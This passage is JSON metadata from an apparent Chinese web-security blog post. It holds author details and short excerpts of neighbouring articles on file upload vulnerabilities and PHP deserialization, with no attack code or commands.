class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0X01-3\"><span class=\"toc-text\">0X01</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0X02-3\"><span class=\"toc-text\">0X02</span></a></li></ol></li></ol></li></ol>","author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"浅析文件上传","uid":"59889abed1e0595b2f38848b74044672","slug":"浅析文件上传","date":"2022-06-18T09:25:28.000Z","updated":"2024-02-14T07:53:20.000Z","comments":true,"path":"api/articles/浅析文件上传.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141553540.png","text":"前言文件上传与文件包含这种漏洞都是比较常见的漏洞，在学习过后对其进行简单总结，希望能对正在学习此部分的师傅们有一些帮助。 漏洞相关信息漏洞定义文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的，“文件上传”...","link":"","photos":[],"count_time":{"symbolsCount":"10k","symbolsTime":"9 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"文件上传","slug":"文件上传","count":1,"path":"api/tags/文件上传.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"从零基础入门PHP反序列化","uid":"7521324f3a376c53e83c35f44da3ffc9","slug":"从零基础入门PHP反序列化","date":"2022-06-17T07:28:30.000Z","updated":"2024-02-14T07:50:26.000Z","comments":true,"path":"api/articles/从零基础入门PHP反序列化.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141547720.png","text":"前言反序列化是一个尤为重要的知识点，最近对反序列化进行了简单学习，并总结如下，希望能对正在学习的师傅有所帮助。 前提了解序列化和反序列化学习反序列化之前，首先要知道序列化，简单的举个栗子来说 &lt;?php $a='quan9i'; echo \"----------初始数据--...","link":"","photos":[],"count_time":{"symbolsCount":"44k","symbolsTime":"40 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"反序列化","slug":"反序列化","count":4,"path":"api/tags/反序列化.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true}}